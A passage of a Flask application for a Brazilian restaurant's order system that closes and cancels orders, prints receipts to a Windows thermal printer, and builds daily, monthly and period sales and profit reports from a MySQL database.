        conn.rollback() 
        print(f"Erro de banco de dados: {e}") 
        traceback.print_exc() 
        flash(f"Erro de banco de dados: {e}", 'error')
    except Exception as e:
        conn.rollback() 
        print(f"Erro inesperado: {e}") 
        traceback.print_exc() 
        flash(f"Erro inesperado: {e}", 'error')
    finally:
        if cursor:
            cursor.close()
        if conn:
            conn.close()
    return redirect(url_for('index'))


@app.route('/encerrar_pedido', methods=['GET', 'POST'])
def encerrar_pedido_web():
    if request.method == 'POST':
        comanda_id = request.form['comanda_id']
        forma_pagamento = request.form['forma_pagamento']
        observacao_pagamento = request.form.get('observacao_pagamento')

        conn = get_db_connection()
        if conn is None:
            flash("Erro ao conectar ao banco de dados.", 'error')
            return redirect(url_for('encerrar_pedido_web', comanda_id=comanda_id))

        cursor = conn.cursor()
        try:
            # sua função existente que fecha e retorna o pedido_id
            pedido_id = fechar_pedido(conn, cursor, comanda_id, forma_pagamento, observacao_pagamento)

            if pedido_id:
                conn.commit()
                flash(f"Pedido da comanda {comanda_id} encerrado com sucesso!", 'success')
                # 👉 imprime automaticamente usando a impressora padrão do Windows
                return redirect(url_for('imprimir_automatico', pedido_id=pedido_id))
            else:
                flash(f"Nenhum pedido aberto encontrado para a comanda {comanda_id}.", 'warning')
                return redirect(url_for('encerrar_pedido_web', comanda_id=comanda_id))

        except Exception as e:
            conn.rollback()
            flash(f"Erro ao encerrar pedido: {e}", 'error')
            return redirect(url_for('encerrar_pedido_web', comanda_id=comanda_id))
        finally:
            cursor.close()
            conn.close()

    # GET: carrega dados da comanda aberta (se houver)
    comanda_id_arg = request.args.get('comanda_id')
    pedido_data = None
    if comanda_id_arg:
        conn = get_db_connection()
        if conn:
            cursor = conn.cursor(pymysql.cursors.DictCursor)
            cursor.execute("""
                SELECT id, comanda_id, valor_total
                FROM pedidos
                WHERE comanda_id = %s AND situacao = 'ABERTO'
            """, (comanda_id_arg,))
            pedido_data = cursor.fetchone()
            cursor.close()
            conn.close()


    return render_template('encerrar_pedido.html', pedido=pedido_data)

import win32print
import win32ui

@app.route('/imprimir_automatico/<int:pedido_id>')
def imprimir_automatico(pedido_id):
    try:
        # 1️⃣ Pega o texto da comanda já gerado pela rota atual
        resp = requests.get(f'http://127.0.0.1:5000/pedido/{pedido_id}/comanda_texto')
        texto = resp.text

        # 2️⃣ Pega a impressora padrão (ou especifique o nome exato)
        printer_name = win32print.GetDefaultPrinter()

        # 3️⃣ Cria o contexto de impressão
        hPrinter = win32print.OpenPrinter(printer_name)
        hJob = win32print.StartDocPrinter(hPrinter, 1, ("Comanda", None, "RAW"))
        win32print.StartPagePrinter(hPrinter)

        # 4️⃣ Envia o texto direto pra impressora térmica
        win32print.WritePrinter(hPrinter, texto.encode('utf-8'))

        # 5️⃣ Finaliza o trabalho
        win32print.EndPagePrinter(hPrinter)
        win32print.EndDocPrinter(hPrinter)
        win32print.ClosePrinter(hPrinter)

        flash(f"Comanda #{pedido_id} impressa com sucesso!", "success")

    except Exception as e:
        flash(f"Erro ao imprimir: {e}", "error")

    return redirect(url_for('index'))


@app.route('/teste_impressora')
def teste_impressora():
    """Página de teste para verificar conexão com QZ Tray e impressora térmica."""
    return render_template('teste_impressora.html')



@app.route('/cancelar_pedido', methods=['GET', 'POST'])
def cancelar_pedido_web():
    if request.method == 'POST':
        comanda_id = request.form['comanda_id']
        senha_digitada = request.form['senha']

        if senha_digitada != _obter_senha_real():
            flash("Senha de administrador incorreta.", 'error')
            return redirect(url_for('cancelar_pedido_web'))

        conn = get_db_connection()
        if conn is None:
            flash("Erro ao conectar ao banco de dados.", 'error')
            return redirect(url_for('cancelar_pedido_web'))
        cursor = conn.cursor(pymysql.cursors.DictCursor)
        try:
            # Buscar dados do pedido antes de cancelar
            cursor.execute("SELECT id, comanda_id, valor_total FROM pedidos WHERE comanda_id = %s AND situacao = 'ABERTO'", (comanda_id,))
            pedido = cursor.fetchone()
            if pedido:
                pedido_id = pedido['id']
                valor_total = pedido['valor_total']
                # Buscar detalhes dos itens
                cursor.execute("SELECT nome_item, quantidade, valor_item FROM pedido_itens WHERE pedido_id = %s", (pedido_id,))
                itens = cursor.fetchall()
                detalhes = "; ".join([f"{item['nome_item']} x{item['quantidade']} (R$ {item['valor_item']:.2f})" for item in itens])
                # Registrar histórico
                cursor.execute("""
                    INSERT INTO historico_cancelamentos (pedido_id, comanda_id, valor_total, detalhes, data_cancelamento)
                    VALUES (%s, %s, %s, %s, NOW())
                """, (pedido_id, comanda_id, valor_total, detalhes))
                conn.commit()
                # Cancelar pedido
                if cancelar_pedido(conn, cursor, comanda_id):
                    flash(f"Pedido com comanda {comanda_id} cancelado e registrado no histórico!", 'success')
                    return redirect(url_for('index'))
                else:
                    flash(f"Nenhum pedido aberto encontrado para a comanda {comanda_id}.", 'warning')
            else:
                flash(f"Nenhum pedido aberto encontrado para a comanda {comanda_id}.", 'warning')
        except pymysql.Error as e:
            conn.rollback()
            flash(f"Erro ao cancelar pedido: {e}", 'error')
            traceback.print_exc()
        except Exception as e:
            conn.rollback()
            flash(f"Erro inesperado ao cancelar pedido: {e}", 'error')
            traceback.print_exc()
        finally:
            if cursor:
                cursor.close()
            if conn:
                conn.close()
    return render_template('cancelar_pedido.html', **get_template_date_vars())



@app.route('/historico_cancelamentos')
@require_admin_login
def historico_cancelamentos():
    conn = get_db_connection()
    cursor = conn.cursor(pymysql.cursors.DictCursor)
    cursor.execute("""
        SELECT hc.*, p.data_abertura
        FROM historico_cancelamentos hc
        LEFT JOIN pedidos p ON hc.pedido_id = p.id
        ORDER BY hc.data_cancelamento DESC
    """)
    historico = cursor.fetchall()
    cursor.close()
    conn.close()
    return render_template('historico_cancelamentos.html', historico=historico, **get_template_date_vars())


@app.route('/logout_admin')
def logout_admin():
    session.pop('admin_logged_in', None)
    flash('Logout realizado com sucesso.', 'info')
    return redirect(url_for('login_admin'))

    

@app.route('/relatorios', methods=['GET', 'POST'])
@require_admin_login
def relatorios_web():
    resultados = {} 
    mes_f = datetime.now().month
    ano_f = datetime.now().year

    if request.method == 'POST':
        try:
            mes_f = int(request.form.get('mes_relatorio'))
            ano_f = int(request.form.get('ano_relatorio'))
        except (ValueError, TypeError):
            flash("Mês ou ano inválido. Exibindo relatório para o mês atual.", 'warning')

    conn = get_db_connection()
    lucro_liquido_total = 0.0
    if conn:
        cursor = conn.cursor(pymysql.cursors.DictCursor)
        try:
            # Total de pedidos fechados no mês
            cursor.execute("""
                SELECT COUNT(id) as total_pedidos_mes
                FROM pedidos
                WHERE situacao = 'FECHADO'
                AND MONTH(data_fechamento) = %s
                AND YEAR(data_fechamento) = %s
            """, (mes_f, ano_f))
            total_pedidos = cursor.fetchone()
            resultados['total_pedidos_mes'] = total_pedidos['total_pedidos_mes'] if total_pedidos and total_pedidos['total_pedidos_mes'] is not None else 0

            # Valor total de vendas do mês
            cursor.execute("""
                SELECT SUM(valor_total) as total_vendas_mes
                FROM pedidos
                WHERE situacao = 'FECHADO'
                AND MONTH(data_fechamento) = %s
                AND YEAR(data_fechamento) = %s
            """, (mes_f, ano_f))
            total_vendas = cursor.fetchone()
            resultados['total_vendas_mes'] = float(total_vendas['total_vendas_mes']) if total_vendas and total_vendas['total_vendas_mes'] is not None else 0.00

            # Ticket Médio do Mês
            cursor.execute("""
                SELECT SUM(valor_total) / COUNT(id) as ticket_medio_mes
                FROM pedidos
                WHERE situacao = 'FECHADO'
                AND MONTH(data_fechamento) = %s
                AND YEAR(data_fechamento) = %s
            """, (mes_f, ano_f))
            ticket_medio = cursor.fetchone()
            resultados['ticket_medio_mes'] = float(ticket_medio['ticket_medio_mes']) if ticket_medio and ticket_medio['ticket_medio_mes'] is not None else 0.00

            # Itens Vendidos no Mês (detalhado)
            cursor.execute("""
                SELECT
                    pi.nome_item,
                    COALESCE(p.categoria, pi.categoria_item_pedido) AS categoria,
                    SUM(pi.quantidade) as total_vendido,
                    COALESCE(SUM(pi.valor_item), 0.00) as valor_total_item,
                    MIN(COALESCE(p.custo, pi.custo_unitario)) as custo_unitario,
                    MIN(COALESCE(p.tipo, pi.tipo_item_pedido)) as tipo_item_pedido
                FROM pedido_itens pi
                JOIN pedidos pe ON pi.pedido_id = pe.id
                LEFT JOIN produtos p ON pi.produto_id = p.id
                WHERE pe.situacao = 'FECHADO'
                AND MONTH(pe.data_fechamento) = %s
                AND YEAR(pe.data_fechamento) = %s
                GROUP BY pi.nome_item, COALESCE(p.categoria, pi.categoria_item_pedido)
                ORDER BY categoria, total_vendido DESC
            """, (mes_f, ano_f))
            itens_vendidos_mes_raw = cursor.fetchall()
            resultados['itens_vendidos_mes'] = [
                {k: (float(v) if isinstance(v, Decimal) else v) for k, v in row.items()}
                for row in itens_vendidos_mes_raw
            ]

            # Cálculo do lucro líquido mensal
            for item in resultados['itens_vendidos_mes']:
                preco_venda = float(item['valor_total_item'])
                quantidade = int(item['total_vendido'])
                custo_unitario = item.get('custo_unitario', 0.0)
                tipo = item.get('tipo_item_pedido', '')
                categoria = item.get('categoria', '')
                nome_item = item.get('nome_item', '')

                if custo_unitario and custo_unitario > 0:
                    lucro_liquido_total += preco_venda - (custo_unitario * quantidade)
                else:
                    if tipo == 'Prato_Dinamico' or ('Prato Dinâmico' in nome_item):
                        lucro_liquido_total += preco_venda * MEDIA_LUCRO_PRATO_DINAMICO
                    elif tipo == 'Sobremesa_Dinamica' or ('Sobremesa' in nome_item):
                        lucro_liquido_total += preco_venda * MEDIA_LUCRO_SOBREMESA_DINAMICA
                    elif tipo == 'Item_Variado_Dinamico' or categoria == 'Outros':
                        lucro_liquido_total += preco_venda * MEDIA_LUCRO_ITEM_VARIADO

            resultados['lucro_liquido_total'] = lucro_liquido_total

            # Marmitas Mais Vendidas
            cursor.execute("""
                SELECT pi.nome_item, SUM(pi.quantidade) as total_vendido
                FROM pedido_itens pi
                JOIN pedidos pe ON pi.pedido_id = pe.id
                LEFT JOIN produtos p ON pi.produto_id = p.id
                WHERE pe.situacao = 'FECHADO'
                AND MONTH(pe.data_fechamento) = %s
                AND YEAR(pe.data_fechamento) = %s
                AND (pi.tipo_item_pedido LIKE 'Marmita%%' OR p.tipo LIKE 'Marmita%%')
                GROUP BY pi.nome_item
                ORDER BY total_vendido DESC
                LIMIT 5
            """, (mes_f, ano_f))
            resultados['marmitas_mais_vendidas'] = cursor.fetchall()

            # Bebidas Mais Vendidas
            cursor.execute("""
                SELECT pi.nome_item, SUM(pi.quantidade) as total_vendido
                FROM pedido_itens pi
                JOIN pedidos pe ON pi.pedido_id = pe.id
                WHERE pe.situacao = 'FECHADO'
                AND MONTH(pe.data_fechamento) = %s
                AND YEAR(pe.data_fechamento) = %s
                AND pi.tipo_item_pedido = %s 
                GROUP BY pi.nome_item
                ORDER BY total_vendido DESC
                LIMIT 5
            """, (mes_f, ano_f, 'Bebida')) 
            resultados['bebidas_mais_vendidas'] = cursor.fetchall()

            # Vendas por Categoria
            cursor.execute("""
                SELECT COALESCE(p.categoria, pi.categoria_item_pedido) AS tipo_item_pedido, SUM(pi.valor_item) as total_vendas_categoria
                FROM pedido_itens pi
                JOIN pedidos pe ON pi.pedido_id = pe.id
                LEFT JOIN produtos p ON pi.produto_id = p.id
                WHERE pe.situacao = 'FECHADO'
                AND MONTH(pe.data_fechamento) = %s
                AND YEAR(pe.data_fechamento) = %s
                GROUP BY COALESCE(p.categoria, pi.categoria_item_pedido)
                ORDER BY total_vendas_categoria DESC
            """, (mes_f, ano_f))
            vendas_por_categoria_raw = cursor.fetchall()
            resultados['vendas_por_categoria'] = {row['tipo_item_pedido']: float(row['total_vendas_categoria']) if row['total_vendas_categoria'] is not None else 0.00 for row in vendas_por_categoria_raw}

            # Vendas por Forma de Pagamento
            cursor.execute("""
                SELECT forma_pagamento, SUM(valor_total) as total_pago
                FROM pedidos
                WHERE situacao = 'FECHADO'
                AND MONTH(data_fechamento) = %s
                AND YEAR(data_fechamento) = %s
                GROUP BY forma_pagamento
                ORDER BY total_pago DESC
            """, (mes_f, ano_f))
            vendas_por_forma_pagamento_raw = cursor.fetchall()
            resultados['vendas_por_forma_pagamento'] = [
                {k: (float(v) if isinstance(v, Decimal) else v) for k, v in row.items()}
                for row in vendas_por_forma_pagamento_raw
            ]

        except pymysql.Error as e:
            flash(f"Erro de banco de dados ao gerar relatórios: {e}", 'error')
            traceback.print_exc() 
        except Exception as e:
            flash(f"Erro inesperado ao gerar relatórios: {e}", 'error')
            traceback.print_exc() 
        finally:
            if conn:
                conn.close()

    mes_nome = datetime(ano_f, mes_f, 1).strftime('%B').capitalize()

    session['relatorio_mensal_data'] = {
        'resultados': resultados,
        'mes_f': mes_f,
        'ano_f': ano_f,
        'mes_nome_f': mes_nome
    }

    return render_template('relatorios.html',
                           resultados=resultados,
                           mes_f=mes_f,
                           ano_f=ano_f,
                           mes_nome_f=mes_nome,
                           datetime=datetime,
                           **get_template_date_vars())

# --- FUNÇÃO RELATÓRIO DETALHADO ---
@app.route('/relatorio_detalhado', methods=['GET', 'POST'])
def relatorio_detalhado_web():
    conn = get_db_connection()
    pedidos_detalhados = []
    
    data_relatorio = datetime.now().date() 
    today_str = data_relatorio.strftime('%Y-%m-%d') 
    data_relatorio_str = None

    if request.method == 'POST':
        data_str_form = request.form.get('data_relatorio')
        try:
            data_relatorio = datetime.strptime(data_str_form, '%Y-%m-%d').date()
            data_relatorio_str = data_str_form 
        except ValueError:
            flash("Data inválida. Exibindo relatório para a data atual.", 'warning')
            data_relatorio = datetime.now().date()
            data_relatorio_str = data_relatorio.strftime('%Y-%m-%d')
    else:
        data_relatorio_str = data_relatorio.strftime('%Y-%m-%d')

    if conn is None:
        flash("Erro ao conectar ao banco de dados para o relatório detalhado.", 'error')
        return render_template('relatorio_detalhado.html',
                               pedidos_detalhados=[],
                               data_relatorio=data_relatorio,
                               data_relatorio_str=data_relatorio_str,
                               today_str=today_str,
                               **get_template_date_vars())
    
    try:
        cursor = conn.cursor(pymysql.cursors.DictCursor)
        cursor.execute("""
            SELECT
                p.comanda_id,
                p.id AS pedido_id,
                p.data_abertura,
                p.data_fechamento,
                p.valor_total,
                p.forma_pagamento,
                GROUP_CONCAT(CONCAT(pi.nome_item, ' (x', pi.quantidade, ')') SEPARATOR ', ') AS itens_formatados
            FROM
                pedidos p
            LEFT JOIN
                pedido_itens pi ON p.id = pi.pedido_id
            WHERE
                p.situacao = 'FECHADO'
                AND DATE(p.data_fechamento) = %s 
            GROUP BY
                p.comanda_id, p.id, p.data_abertura, p.data_fechamento, p.valor_total, p.forma_pagamento
            ORDER BY
                p.data_fechamento ASC, p.id ASC;
        """, (data_relatorio,)) 
        pedidos_detalhados = cursor.fetchall()

        for pedido in pedidos_detalhados:
            if 'valor_total' in pedido and isinstance(pedido['valor_total'], Decimal):
                pedido['valor_total'] = float(pedido['valor_total'])

    except pymysql.Error as e:
        flash(f"Erro de banco de dados ao gerar relatório detalhado: {e}", 'error')
        traceback.print_exc()
    except Exception as e:
        flash(f"Erro inesperado ao gerar relatório detalhado: {e}", 'error')
        traceback.print_exc()
    finally:
        if conn:
            conn.close()
    
    # Armazenar dados na sessão para exportação
    session['relatorio_detalhado_data'] = {
        'pedidos_detalhados': pedidos_detalhados,
        'data_relatorio': data_relatorio.strftime('%Y-%m-%d') 
    }

    return render_template('relatorio_detalhado.html',
                           pedidos_detalhados=pedidos_detalhados,
                           data_relatorio=data_relatorio, 
                           data_relatorio_str=data_relatorio_str, 
                           today_str=today_str, 
                           **get_template_date_vars())




@app.route('/relatorio_diario', methods=['GET', 'POST'])
def relatorio_diario_web():
    resultados = {}
    data_relatorio = datetime.now().date() 

    if request.method == 'POST':
        data_str = request.form.get('data_relatorio')
        try:
            data_relatorio = datetime.strptime(data_str, '%Y-%m-%d').date()
        except ValueError:
            flash("Data inválida. Usando a data atual.", 'warning')
            data_relatorio = datetime.now().date()

    conn = get_db_connection()
    lucro_liquido_total = 0.0
    if conn:
        cursor = conn.cursor(pymysql.cursors.DictCursor)
        try:
            # Total de Pedidos Fechados no Dia
            cursor.execute("""
                SELECT COUNT(id) AS total_pedidos_dia
                FROM pedidos
                WHERE situacao = 'FECHADO'
                AND DATE(data_fechamento) = %s
            """, (data_relatorio,))
            resultados['total_pedidos_dia'] = cursor.fetchone()['total_pedidos_dia'] or 0

            # Valor Total de Vendas no Dia
            cursor.execute("""
                SELECT COALESCE(SUM(valor_total), 0.00) AS valor_total_vendas_dia
                FROM pedidos
                WHERE situacao = 'FECHADO'
                AND DATE(data_fechamento) = %s
            """, (data_relatorio,))
            resultados['valor_total_vendas_dia'] = float(cursor.fetchone()['valor_total_vendas_dia']) or 0.00

            # Vendas por Forma de Pagamento no Dia
            cursor.execute("""
                SELECT forma_pagamento, COALESCE(SUM(valor_total), 0.00) as total_pago
                FROM pedidos
                WHERE situacao = 'FECHADO'
                AND DATE(data_fechamento) = %s
                GROUP BY forma_pagamento
                ORDER BY total_pago DESC
            """, (data_relatorio,))
            vendas_por_forma_pagamento_raw = cursor.fetchall()
            resultados['vendas_por_forma_pagamento_dia'] = [
                {k: (float(v) if isinstance(v, Decimal) else v) for k, v in row.items()}
                for row in vendas_por_forma_pagamento_raw
            ]

            # Itens Vendidos no Dia (detalhado)
            cursor.execute("""
                SELECT
                    pi.nome_item,
                    COALESCE(p.categoria, pi.categoria_item_pedido) AS categoria,
                    SUM(pi.quantidade) as total_vendido,
                    COALESCE(SUM(pi.valor_item), 0.00) as valor_total_item,
                    MIN(COALESCE(p.custo, pi.custo_unitario)) as custo_unitario,
                    MIN(COALESCE(p.tipo, pi.tipo_item_pedido)) as tipo_item_pedido
                FROM pedido_itens pi
                JOIN pedidos pe ON pi.pedido_id = pe.id
                LEFT JOIN produtos p ON pi.produto_id = p.id
                WHERE pe.situacao = 'FECHADO'
                AND DATE(pe.data_fechamento) = %s
                GROUP BY pi.nome_item, COALESCE(p.categoria, pi.categoria_item_pedido)
                ORDER BY categoria, total_vendido DESC
            """, (data_relatorio,))
            itens_vendidos_dia_raw = cursor.fetchall()
            resultados['itens_vendidos_dia'] = [
                {k: (float(v) if isinstance(v, Decimal) else v) for k, v in row.items()}
                for row in itens_vendidos_dia_raw
            ]

            # Cálculo do lucro líquido
            for item in resultados['itens_vendidos_dia']:
                preco_venda = float(item['valor_total_item'])
                quantidade = int(item['total_vendido'])
                custo_unitario = item.get('custo_unitario', 0.0)
                tipo = item.get('tipo_item_pedido', '')
                categoria = item.get('categoria', '')
                nome_item = item.get('nome_item', '')

                if custo_unitario and custo_unitario > 0:
                    lucro_liquido_total += preco_venda - (custo_unitario * quantidade)
                else:
                    # Para dinâmicos, aplica a média
                    if tipo == 'Prato_Dinamico' or ('Prato Dinâmico' in nome_item):
                        lucro_liquido_total += preco_venda * MEDIA_LUCRO_PRATO_DINAMICO
                    elif tipo == 'Sobremesa_Dinamica' or ('Sobremesa' in nome_item):
                        lucro_liquido_total += preco_venda * MEDIA_LUCRO_SOBREMESA_DINAMICA
                    elif tipo == 'Item_Variado_Dinamico' or categoria == 'Outros':
                        lucro_liquido_total += preco_venda * MEDIA_LUCRO_ITEM_VARIADO

            resultados['lucro_liquido_total'] = lucro_liquido_total
        
        

        except pymysql.Error as e:
            flash(f"Erro de banco de dados ao gerar relatório diário: {e}", 'error')
            traceback.print_exc()
        except Exception as e:
            flash(f"Erro inesperado ao gerar relatório diário: {e}", 'error')
            traceback.print_exc()
        finally:
            if conn:
                conn.close()

    # Armazenar dados na sessão para exportação
    session['relatorio_diario_data'] = {
        'resultados': resultados,
        'data_relatorio': data_relatorio.strftime('%Y-%m-%d') 
    }


    if 'lucro_liquido_total' not in resultados:
        resultados['lucro_liquido_total'] = 0.0

    return render_template('relatorio_diario.html',
                           data_relatorio=data_relatorio,
                           resultados=resultados,)

@app.route('/relatorio_diarioadm', methods=['GET', 'POST'])
@require_admin_login
def relatorio_diario_webadm():
    resultados = {}
    data_relatorio = datetime.now().date() 

    if request.method == 'POST':
        data_str = request.form.get('data_relatorio')
        try:
            data_relatorio = datetime.strptime(data_str, '%Y-%m-%d').date()
        except ValueError:
            flash("Data inválida. Usando a data atual.", 'warning')
            data_relatorio = datetime.now().date()

    conn = get_db_connection()
    lucro_liquido_total = 0.0
    if conn:
        cursor = conn.cursor(pymysql.cursors.DictCursor)
        try:
            # Total de Pedidos Fechados no Dia
            cursor.execute("""
                SELECT COUNT(id) AS total_pedidos_dia
                FROM pedidos
                WHERE situacao = 'FECHADO'
                AND DATE(data_fechamento) = %s
            """, (data_relatorio,))
            resultados['total_pedidos_dia'] = cursor.fetchone()['total_pedidos_dia'] or 0

            # Valor Total de Vendas no Dia
            cursor.execute("""
                SELECT COALESCE(SUM(valor_total), 0.00) AS valor_total_vendas_dia
                FROM pedidos
                WHERE situacao = 'FECHADO'
                AND DATE(data_fechamento) = %s
            """, (data_relatorio,))
            resultados['valor_total_vendas_dia'] = float(cursor.fetchone()['valor_total_vendas_dia']) or 0.00

            # Vendas por Forma de Pagamento no Dia
            cursor.execute("""
                SELECT forma_pagamento, COALESCE(SUM(valor_total), 0.00) as total_pago
                FROM pedidos
                WHERE situacao = 'FECHADO'
                AND DATE(data_fechamento) = %s
                GROUP BY forma_pagamento
                ORDER BY total_pago DESC
            """, (data_relatorio,))
            vendas_por_forma_pagamento_raw = cursor.fetchall()
            resultados['vendas_por_forma_pagamento_dia'] = [
                {k: (float(v) if isinstance(v, Decimal) else v) for k, v in row.items()}
                for row in vendas_por_forma_pagamento_raw
            ]

            # Itens Vendidos no Dia (detalhado)
            cursor.execute("""
                SELECT
                    pi.nome_item,
                    COALESCE(p.categoria, pi.categoria_item_pedido) AS categoria,
                    SUM(pi.quantidade) as total_vendido,
                    COALESCE(SUM(pi.valor_item), 0.00) as valor_total_item,
                    MIN(COALESCE(p.custo, pi.custo_unitario)) as custo_unitario,
                    MIN(COALESCE(p.tipo, pi.tipo_item_pedido)) as tipo_item_pedido
                FROM pedido_itens pi
                JOIN pedidos pe ON pi.pedido_id = pe.id
                LEFT JOIN produtos p ON pi.produto_id = p.id
                WHERE pe.situacao = 'FECHADO'
                AND DATE(pe.data_fechamento) = %s
                GROUP BY pi.nome_item, COALESCE(p.categoria, pi.categoria_item_pedido)
                ORDER BY categoria, total_vendido DESC
            """, (data_relatorio,))
            itens_vendidos_dia_raw = cursor.fetchall()
            resultados['itens_vendidos_dia'] = [
                {k: (float(v) if isinstance(v, Decimal) else v) for k, v in row.items()}
                for row in itens_vendidos_dia_raw
            ]

            # Cálculo do lucro líquido
            for item in resultados['itens_vendidos_dia']:
                preco_venda = float(item['valor_total_item'])
                quantidade = int(item['total_vendido'])
                custo_unitario = item.get('custo_unitario', 0.0)
                tipo = item.get('tipo_item_pedido', '')
                categoria = item.get('categoria', '')
                nome_item = item.get('nome_item', '')

                if custo_unitario and custo_unitario > 0:
                    lucro_liquido_total += preco_venda - (custo_unitario * quantidade)
                else:
                    # Para dinâmicos, aplica a média
                    if tipo == 'Prato_Dinamico' or ('Prato Dinâmico' in nome_item):
                        lucro_liquido_total += preco_venda * MEDIA_LUCRO_PRATO_DINAMICO
                    elif tipo == 'Sobremesa_Dinamica' or ('Sobremesa' in nome_item):
                        lucro_liquido_total += preco_venda * MEDIA_LUCRO_SOBREMESA_DINAMICA
                    elif tipo == 'Item_Variado_Dinamico' or categoria == 'Outros':
                        lucro_liquido_total += preco_venda * MEDIA_LUCRO_ITEM_VARIADO

            resultados['lucro_liquido_total'] = lucro_liquido_total
        
        

        except pymysql.Error as e:
            flash(f"Erro de banco de dados ao gerar relatório diário: {e}", 'error')
            traceback.print_exc()
        except Exception as e:
            flash(f"Erro inesperado ao gerar relatório diário: {e}", 'error')
            traceback.print_exc()
        finally:
            if conn:
                conn.close()

    # Armazenar dados na sessão para exportação
    session['relatorio_diario_data'] = {
        'resultados': resultados,
        'data_relatorio': data_relatorio.strftime('%Y-%m-%d') 
    }


    if 'lucro_liquido_total' not in resultados:
        resultados['lucro_liquido_total'] = 0.0

    return render_template('relatorio_diarioadm.html',
                           data_relatorio=data_relatorio,
                           resultados=resultados,
                           **get_template_date_vars())

@app.route('/relatorio_periodo', methods=['GET', 'POST'])
@require_admin_login
def relatorio_periodo_web():
    resultados = {}
    data_inicial = datetime.now().date()
    data_final = datetime.now().date()

    if request.method == 'POST':
        try:
            data_inicial = datetime.strptime(request.form.get('data_inicial'), '%Y-%m-%d').date()
            data_final = datetime.strptime(request.form.get('data_final'), '%Y-%m-%d').date()
        except ValueError:
            flash("Datas inválidas. Usando o dia atual.", 'warning')

    conn = get_db_connection()
    lucro_liquido_total = 0.0

    if conn:
        cursor = conn.cursor(pymysql.cursors.DictCursor)
        try:
            # Total de Pedidos no período
            cursor.execute("""
                SELECT COUNT(id) AS total_pedidos_periodo,
                       COALESCE(SUM(valor_total),0.00) AS valor_total_periodo
                FROM pedidos
                WHERE situacao = 'FECHADO'
                AND DATE(data_fechamento) BETWEEN %s AND %s
            """, (data_inicial, data_final))
            dados = cursor.fetchone()
            resultados['total_pedidos_periodo'] = dados['total_pedidos_periodo']
            resultados['valor_total_periodo'] = float(dados['valor_total_periodo'])

            # Itens vendidos no período
            cursor.execute("""
                SELECT
                    pi.nome_item,
                    COALESCE(p.categoria, pi.categoria_item_pedido) AS categoria,
                    SUM(pi.quantidade) as total_vendido,
                    COALESCE(SUM(pi.valor_item), 0.00) as valor_total_item,
                    MIN(COALESCE(p.custo, pi.custo_unitario)) as custo_unitario,
                    MIN(COALESCE(p.tipo, pi.tipo_item_pedido)) as tipo_item_pedido
                FROM pedido_itens pi
                JOIN pedidos pe ON pi.pedido_id = pe.id
                LEFT JOIN produtos p ON pi.produto_id = p.id
                WHERE pe.situacao = 'FECHADO'
                AND DATE(pe.data_fechamento) BETWEEN %s AND %s
                GROUP BY pi.nome_item, COALESCE(p.categoria, pi.categoria_item_pedido)
                ORDER BY categoria, total_vendido DESC
            """, (data_inicial, data_final))
            itens = cursor.fetchall()

            for item in itens:
                # Converte tudo para float/int, para evitar erro de tipo Decimal
                preco_venda = float(item['valor_total_item'] or 0)
                quantidade = int(item['total_vendido'] or 0)
                custo_unitario = float(item.get('custo_unitario') or 0)
                tipo = item.get('tipo_item_pedido', '') or ''
                categoria = item.get('categoria', '') or ''
                nome_item = item.get('nome_item', '') or ''

                if custo_unitario and custo_unitario > 0:
                    lucro_liquido_total += preco_venda - (custo_unitario * quantidade)
                else:
                    # Corrigido: cada condição agora é avaliada corretamente
                    if (tipo == 'Prato_Dinamico') or ('Prato Dinâmico' in nome_item):
                        lucro_liquido_total += preco_venda * MEDIA_LUCRO_PRATO_DINAMICO
                    elif (tipo == 'Sobremesa_Dinamica') or ('Sobremesa' in nome_item):
                        lucro_liquido_total += preco_venda * MEDIA_LUCRO_SOBREMESA_DINAMICA
                    elif (tipo == 'Item_Variado_Dinamico') or (categoria == 'Outros'):
                        lucro_liquido_total += preco_venda * MEDIA_LUCRO_ITEM_VARIADO

            resultados['lucro_liquido_total'] = lucro_liquido_total

        finally:
            conn.close()

    # Guardar para PDF
    session['relatorio_periodo'] = {
        'data_inicial': data_inicial.strftime('%Y-%m-%d'),
        'data_final': data_final.strftime('%Y-%m-%d'),
        'resultados': resultados
    }

    return render_template('relatorio_periodo.html',
                           resultados=resultados,
                           data_inicial=data_inicial,
                           data_final=data_final,
                           **get_template_date_vars())



@app.route('/gerar_pdf_periodo')
@require_admin_login
def gerar_pdf_periodo():
    from io import BytesIO
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
    from reportlab.lib.pagesizes import A4
    from reportlab.lib import colors
    from reportlab.lib.styles import ParagraphStyle
    from reportlab.lib.enums import TA_CENTER
    from reportlab.lib.units import cm
    from datetime import datetime, timedelta
    import pymysql
    from decimal import Decimal

    data = session.get('relatorio_periodo', {})
    data_inicial = data.get('data_inicial')
    data_final = data.get('data_final')

    if not data_inicial or not data_final:
        flash("Período não encontrado. Gere o relatório novamente.", "error")
        return redirect(url_for('relatorio_periodo_web'))

    data_inicial = datetime.strptime(data_inicial, '%Y-%m-%d').date()
    data_final = datetime.strptime(data_final, '%Y-%m-%d').date()

    conn = get_db_connection()
    cursor = conn.cursor(pymysql.cursors.DictCursor)

    # Busca todos os dias do período com soma de vendas e lucro calculado via itens
    cursor.execute("""
        SELECT DATE(pe.data_fechamento) AS data_dia
        FROM pedidos pe
        WHERE pe.situacao = 'FECHADO'
        AND DATE(pe.data_fechamento) BETWEEN %s AND %s
        GROUP BY DATE(pe.data_fechamento)
        ORDER BY DATE(pe.data_fechamento)
    """, (data_inicial, data_final))

    dias = cursor.fetchall()
    blocos = []
    bloco_atual = []
    inicio_bloco = None

    for d in dias:
        data_dia = d['data_dia']

        # Busca vendas e lucro desse dia (igual ao relatório diário)
        cursor.execute("""
            SELECT
                pi.nome_item,
                COALESCE(p.categoria, pi.categoria_item_pedido) AS categoria,
                SUM(pi.quantidade) as total_vendido,
                COALESCE(SUM(pi.valor_item), 0.00) as valor_total_item,
                MIN(COALESCE(p.custo, pi.custo_unitario)) as custo_unitario,
                MIN(COALESCE(p.tipo, pi.tipo_item_pedido)) as tipo_item_pedido
            FROM pedido_itens pi
            JOIN pedidos pe ON pi.pedido_id = pe.id
            LEFT JOIN produtos p ON pi.produto_id = p.id
            WHERE pe.situacao = 'FECHADO'
            AND DATE(pe.data_fechamento) = %s
            GROUP BY pi.nome_item, COALESCE(p.categoria, pi.categoria_item_pedido)
        """, (data_dia,))

        itens = cursor.fetchall()
        total_vendas = 0
        lucro_liq = 0

        for item in itens:
            preco_venda = float(item['valor_total_item'] or 0)
            quantidade = int(item['total_vendido'] or 0)
            custo_unitario = float(item.get('custo_unitario') or 0)
            tipo = item.get('tipo_item_pedido', '')
